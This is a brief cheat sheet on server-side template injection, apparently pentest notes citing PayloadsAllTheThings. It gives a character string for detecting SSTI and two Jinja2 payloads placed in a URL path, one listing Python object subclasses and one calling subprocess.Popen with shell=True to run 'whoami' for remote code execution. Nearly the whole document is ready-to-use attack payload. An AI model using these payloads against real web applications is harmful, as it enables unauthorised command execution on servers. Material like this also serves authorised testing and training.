# Server-Side Template Injection (SSTI)
```
${{<%[%'"}}%    # Special characteres for detection
```
## Python
### Jinja2
```
http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__() }}   # To list all objects
http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}   # Using subprocess.Popen index in 401 to achieve rce
```
Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
